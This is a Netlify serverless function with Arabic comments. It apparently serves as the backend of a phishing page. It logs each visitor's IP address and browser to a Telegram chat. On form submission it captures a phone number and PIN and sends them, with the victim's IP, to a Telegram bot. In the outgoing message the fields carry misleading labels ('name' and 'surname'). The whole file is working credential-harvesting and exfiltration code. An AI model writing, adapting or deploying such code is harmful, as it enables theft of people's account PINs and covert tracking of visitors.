exports.handler = async (event) => {
    try {
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        // استخراج الآيبي واليوزر أجنت من الـ headers التي توفرها Netlify
        const ip = event.headers['client-ip'] || event.headers['x-forwarded-for'] || "Unknown IP";
        const userAgent = event.headers['user-agent'] || "Unknown Browser";

        let messageText = "";

        // حالة 1: إذا كان الطلب مجرد "زيارة" (سيكون طلب GET مثلاً)
        if (event.httpMethod === "GET") {
            messageText = `👀 *زيارة جديدة للموقع:*\n\n🌐 IP: \`${ip}\` \n📱 المتصفح: \`${userAgent}\``;
        } 
        // حالة 2: إذا كان الطلب إرسال بيانات (POST)
        else if (event.httpMethod === "POST") {
            const { phone, pin } = JSON.parse(event.body);
            messageText = `📩 *بيانات مستخدم جديدة:*\n\n👤 الاسم: ${phone}\n👥 الكنية: ${pin}\n\n📍 مصدر الإرسال (IP): \`${ip}\``;
        }

        // إرسال الرسالة إلى تيليجرام
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: messageText,
                parse_mode: 'Markdown'
            })
        });

        return { statusCode: 200, body: "Done" };

    } catch (error) {
        return { statusCode: 500, body: error.toString() };
    }
};
